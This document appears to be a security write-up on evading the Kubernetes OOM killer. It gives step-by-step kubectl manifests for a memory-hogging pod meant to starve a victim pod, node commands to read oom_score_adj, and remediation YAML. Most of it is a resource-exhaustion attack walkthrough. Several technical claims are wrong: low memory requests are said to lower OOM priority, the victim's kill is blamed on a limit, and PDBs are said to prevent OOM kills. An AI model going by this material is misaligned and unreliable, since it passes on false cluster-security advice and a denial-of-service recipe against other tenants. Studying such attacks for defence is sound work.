
# Kubernetes OOM Killer Evasion Strategies

## 1. Overview Section

This document outlines techniques to evade the Kubernetes Out-of-Memory (OOM) killer, allowing a malicious pod to consume excessive resources and potentially disrupt other applications within the cluster.  Evasion involves manipulating resource requests, limits, and process priorities to avoid being identified as the prime candidate for termination when the system runs low on memory.

**Attack Vector Description:**

An attacker deploys a pod that deliberately or inadvertently consumes excessive memory.  Instead of being killed by the OOM killer, the pod employs strategies to influence the OOM killer's decision-making process, allowing it to continue running while potentially starving other, more critical pods of resources or causing system instability. The attacker effectively performs a Denial-of-Service (DoS) attack by resource exhaustion.

**Potential Impact and Consequences:**

*   **Denial-of-Service (DoS):**  The primary impact is denying resources to other applications running on the same node. This can lead to service unavailability, slow response times, and overall degradation of application performance.
*   **Node Instability:** In extreme cases, the memory exhaustion can lead to node instability and even crash the node, impacting all pods running on it.
*   **Data Loss:**  If critical applications are terminated due to memory starvation, it can lead to data loss.
*   **Resource Abuse:** Malicious actors can abuse the system to perform resource-intensive tasks (e.g., cryptomining) at the expense of other tenants in a shared cluster.

**Risk Level Assessment:**

*   **High:** The vulnerability can lead to significant disruption of services and potentially impact data integrity. The ability to evade the OOM killer offers a persistent attack vector for resource exhaustion.

**Technical Explanation of Why This Vulnerability Exists:**

The Kubernetes OOM killer relies on the Linux kernel OOM killer. The kernel's OOM killer assigns a `oom_score` to each process, based on factors like memory usage, priority, and root privileges. The process with the highest `oom_score` is usually targeted for termination.  Exploitation involves manipulating these factors to lower a malicious pod's `oom_score` relative to other pods, making it a less attractive target. This can be accomplished through setting lower resource requests, setting higher priority classes, or performing actions that reduce the observed memory pressure on the container from the node's perspective. Misconfigured resource limits and priority classes can also exacerbate the problem.

**Prerequisites and Conditions Needed:**

*   **Ability to Deploy Pods:** The attacker needs the permissions to deploy pods in the Kubernetes cluster. This typically requires `create` access to pods in a given namespace.
*   **Cluster with Limited Resources:**  The attack is more effective on clusters with limited memory resources, making it easier to trigger the OOM killer.
*   **Understanding of Kubernetes Resource Management:** The attacker needs to understand how Kubernetes manages resources, particularly resource requests, limits, and priority classes.
*   **Tools:**  `kubectl` is required to interact with the Kubernetes API. Standard Linux command-line tools like `ps`, `cat`, and `free` can be useful for monitoring resource usage.

## 2. Validation and Exploitation Steps Section

This section provides a step-by-step guide to validating and exploiting OOM killer evasion strategies.

**Step 1: Deploy a Resource-Intensive Pod**

This step deploys a pod that will consume a significant amount of memory.

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: memory-hog
spec:
  containers:
  - name: memory-hog
    image: busybox
    resources:
      requests:
        memory: "10Mi"
      limits:
        memory: "100Mi"
    command: ["/bin/sh", "-c"]
    args:
    - |
      while true; do
        dd if=/dev/zero of=/tmp/memhog bs=1M count=100
        rm /tmp/memhog
        sleep 1
      done
EOF
```

**Explanation:**

*   `kubectl apply -f - <<EOF ... EOF`:  This applies a Kubernetes manifest directly from the command line.
*   `apiVersion: v1`, `kind: Pod`: Defines a basic pod configuration.
*   `metadata: name: memory-hog`:  Sets the name of the pod.
*   `spec.containers.0.image: busybox`:  Specifies the container image. `busybox` is a lightweight Linux distribution that is commonly used for testing.
*   `resources.requests.memory: "10Mi"`, `resources.limits.memory: "100Mi"`: Sets resource requests and limits for the container. This is crucial: we are requesting a small amount of memory (10Mi) but are allowing the pod to use up to 100Mi. This difference allows us to easily exhaust resources beyond the initial request.
*   `command: ["/bin/sh", "-c"]`: Specifies the command to execute inside the container.
*   `args: ...`: Specifies the arguments to the command.  The `while` loop continuously allocates and deletes a 100MiB file, effectively consuming and releasing memory rapidly.
*   `dd if=/dev/zero of=/tmp/memhog bs=1M count=100`:  Creates a 100MB file filled with zeros.
*   `rm /tmp/memhog`: Removes the created file.
*   `sleep 1`: Pauses for 1 second.

**Expected Output:**

The pod should be created successfully.

```
pod/memory-hog created
```

**Validation:**

Use `kubectl get pods` to confirm the pod is running.

```bash
kubectl get pods
```

**Step 2: Monitor Memory Usage on the Node**

This step identifies the node where the `memory-hog` pod is running and monitors its memory usage.

```bash
NODE=$(kubectl get pod memory-hog -o jsonpath='{.spec.nodeName}')
echo "Node running memory-hog: $NODE"
```

**Explanation:**

*   `kubectl get pod memory-hog -o jsonpath='{.spec.nodeName}'`: Retrieves the name of the node where the `memory-hog` pod is running. The `-o jsonpath` option allows extracting specific fields from the pod's JSON representation.
*   `NODE=$(...)`: Stores the node name in the `NODE` variable.
*   `echo "Node running memory-hog: $NODE"`: Prints the node name to the console.

**Expected Output:**

The output will display the name of the node where the `memory-hog` pod is running.  For example:

```
Node running memory-hog: worker-node-1
```

Next, monitor memory usage.  This requires access to the node itself or access to metrics collection. Here, we demonstrate obtaining node stats using `kubectl top`. If `kubectl top node` is not working due to missing metrics server setup, consider setting up a metrics server, or SSH'ing into the node and using standard Linux tools like `top` or `free`.

```bash
kubectl top node $NODE
```

**Explanation:**

*   `kubectl top node $NODE`: Displays resource usage (CPU and memory) for the specified node.

**Expected Output:**

The output will show the memory usage of the node. Look for increasing memory usage over time as the `memory-hog` pod consumes resources.

```
NAME           CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%
worker-node-1   286m         14%    3567Mi          45%
```

Monitor this output periodically to observe the memory consumption.

**Step 3: Deploy Another Pod with Higher Resource Requests (Victim Pod)**

This step introduces a "victim" pod that requests more resources than the memory-hog pod. This makes it a potential target for the OOM killer if the memory-hog pod exhausts available resources.

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: victim-pod
spec:
  containers:
  - name: victim-pod
    image: nginx
    resources:
      requests:
        memory: "50Mi"
      limits:
        memory: "200Mi"
EOF
```

**Explanation:**

*   `kubectl apply -f - <<EOF ... EOF`: Applies a Kubernetes manifest.
*   `apiVersion: v1`, `kind: Pod`: Defines a basic pod.
*   `metadata: name: victim-pod`: Sets the pod name.
*   `spec.containers.0.image: nginx`: Uses the `nginx` image.
*   `resources.requests.memory: "50Mi"`, `resources.limits.memory: "200Mi"`:  The victim pod requests 50Mi of memory and has a limit of 200Mi.

**Expected Output:**

The pod should be created successfully.

```
pod/victim-pod created
```

**Validation:**

Use `kubectl get pods` to verify that both `memory-hog` and `victim-pod` are running.

```bash
kubectl get pods
```

**Step 4: Exploit: Manipulating OOM Score by Setting Low Resource Requests**

The `memory-hog` pod already has relatively low resource requests compared to its potential consumption. Because resource requests are lower than resource limits, the container is allowed to consume resources to the limit. Further, the OOM score adjustment will be influenced more by actual memory consumed than resource request.

To further attempt to evade the OOM killer, we can try to influence the `oom_score_adj` by setting an even lower resource request (if it weren't already set low). This is already done due to the initial setup, which allows the memory hog to consume resources up to the resource limit, which is more than the request. It's often beneficial to use a higher resource limit but lower request than the victim pod.

**Explanation:**

A lower resource *request*, coupled with a higher resource *limit*, effectively tells Kubernetes to prioritize *scheduling* based on the low request, but still allows the pod to consume significantly more resources *at runtime*. Since Kubernetes uses OOM killer scores heavily influenced by resource usage relative to the request, this can help to make the pod a less desirable target than others which may request the same or more resources. This is especially true in non Guaranteed QoS classes where OOM priority is determined solely by usage relative to resource requests.

**Validation:**

Monitor the memory usage of the node using `kubectl top node` and observe whether the `victim-pod` gets OOM killed before the `memory-hog` pod.

```bash
kubectl top node $NODE
```

**Step 5: Validate OOM Killer Activity and Pod Termination**

Check for OOM killer events by examining the Kubernetes events and logs.  Look for evidence of the OOM killer terminating the `victim-pod`.

```bash
kubectl get events --sort-by='.metadata.creationTimestamp'
```

**Explanation:**

*   `kubectl get events --sort-by='.metadata.creationTimestamp'`: Retrieves Kubernetes events and sorts them by timestamp to show the events in chronological order.

**Expected Output:**

Look for events related to the OOM killer, particularly those that indicate that a pod was terminated due to OOM. For example:

```
LAST SEEN   TYPE      REASON     OBJECT                        MESSAGE
...
2m          Warning   OOMKilled  pod/victim-pod               Container victim-pod oom killed (memory limit exceeded)
```

If the `victim-pod` is killed before the `memory-hog` pod, the OOM killer evasion strategy is working, to some extent. It shows that low resource request allows the memory hog pod to consume resources and make victim pods the target for the OOM killer. If you did not configure the low resource request and high limit properly (as in the code samples above), then the `memory-hog` pod will likely be killed instead.

**Alternative Approach: Monitoring OOM Score Adjust (requires node access)**

If you have access to the node, you can directly observe the `oom_score_adj` value for each process. First, find the container ID of the `memory-hog` and `victim-pod` containers.

```bash
POD_NAME="memory-hog" # or "victim-pod"
CONTAINER_ID=$(kubectl describe pod $POD_NAME | grep -oP 'docker://\K[a-z0-9]+')
echo "Container ID for $POD_NAME: $CONTAINER_ID"
```

Then, SSH into the node and find the process ID (PID) of the container process:

```bash
# Replace <NODE_NAME> with the actual node name from Step 2
ssh <USER>@<NODE_IP_ADDRESS>

# Use crictl if docker isn't available to find the process ID
PID=$(docker inspect -f '{{.State.Pid}}' $CONTAINER_ID)  # or crictl inspect  -o json $CONTAINER_ID | jq .info.pid
echo "PID of container: $PID"
```

Finally, read the `oom_score_adj` value:

```bash
cat /proc/$PID/oom_score_adj
```

**Explanation:**

*  The initial command obtains the container ID associated with the Kubernetes Pod.
*  `docker inspect` (or `crictl inspect`) retrieves the process ID from the container's metadata.
*  `cat /proc/$PID/oom_score_adj` reads the OOM score adjustment for the process from the `/proc` filesystem. A lower value indicates a lower likelihood of being targeted by the OOM killer.

By comparing the `oom_score_adj` values of the `memory-hog` and `victim-pod` processes, you can directly validate whether the resource request manipulation is successfully lowering the `memory-hog`'s OOM score relative to the `victim-pod`.

**Remediation Recommendations:**

*   **Enforce Resource Quotas:** Implement resource quotas at the namespace level to limit the total amount of resources that can be consumed by pods in a namespace. This prevents a single namespace from monopolizing cluster resources.

    ```yaml
    apiVersion: v1
    kind: ResourceQuota
    metadata:
      name: mem-cpu-quota
    spec:
      hard:
        requests.cpu: "2"
        requests.memory: "2Gi"
        limits.cpu: "4"
        limits.memory: "4Gi"
    ```

*   **Set Default Resource Limits:** Configure default resource limits for containers in namespaces. This ensures that all containers have reasonable limits, even if they are not explicitly specified in the pod manifest.  Use LimitRanges.

    ```yaml
    apiVersion: v1
    kind: LimitRange
    metadata:
      name: mem-limit-range
    spec:
      limits:
      - default:
          memory: 512Mi
          cpu: 1
        defaultRequest:
          memory: 256Mi
          cpu: 0.5
        type: Container
    ```

*   **Monitor Resource Usage:** Implement robust monitoring to track resource consumption by pods and nodes. Set up alerts to notify administrators when resource usage exceeds predefined thresholds. Tools like Prometheus and Grafana can be used for monitoring.
*   **Priority Classes:** Use priority classes to prioritize critical workloads. Higher priority pods are less likely to be killed by the OOM killer.  Carefully consider the implications when doing so, as abuse may result.
*   **Limit Container Access:** Ensure containers run with the least privilege necessary. Avoid giving containers unnecessary root privileges, as this can influence the OOM killer's decision-making process.
*   **Enable Pod Disruption Budgets (PDBs):** PDBs can protect critical applications from being disrupted, including being killed by the OOM killer. They define the minimum number of replicas that must be available at all times.

    ```yaml
    apiVersion: policy/v1
    kind: PodDisruptionBudget
    metadata:
      name: my-pdb
    spec:
      minAvailable: 2
      selector:
        matchLabels:
          app: my-app
    ```

*   **Regular Security Audits:** Conduct regular security audits to identify and address potential vulnerabilities, including OOM killer evasion strategies.
*   **Network Policies**: Implement network policies to restrict communication between pods. This can help to isolate malicious pods and prevent them from impacting other services. This indirectly impacts this vulnerability by limiting the blast radius.

```
